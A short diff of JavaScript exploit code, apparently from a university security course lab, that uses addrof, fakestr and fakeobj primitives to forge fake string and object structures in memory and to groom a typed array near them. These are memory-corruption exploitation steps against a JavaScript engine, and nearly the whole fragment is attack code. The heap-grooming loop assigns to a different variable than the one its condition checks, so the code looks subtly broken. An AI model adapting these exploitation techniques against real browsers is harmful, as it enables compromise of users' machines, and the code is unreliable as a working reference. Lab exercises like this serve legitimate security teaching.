@@ -6,7 +6,7 @@ let strfront = String.fromCharCode(1, 0, 0, 0, 0, 225, 245, 5, 0, 0, 0, 0, 0, 0,
 let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);
 
 let originarray = new Uint32Array(72);
-while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
+while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 9999944) {
     array = new Uint32Array(72);
 }
 
@@ -31,7 +31,6 @@ while(fb < 8) {
     fb++;
 }
 
-// codes[0] = codes[0] + 1;
 let cc = String.fromCharCode(...codes)
 let control = cs361s.fakeobj(cs361s.addrof(cc) + 16);
 
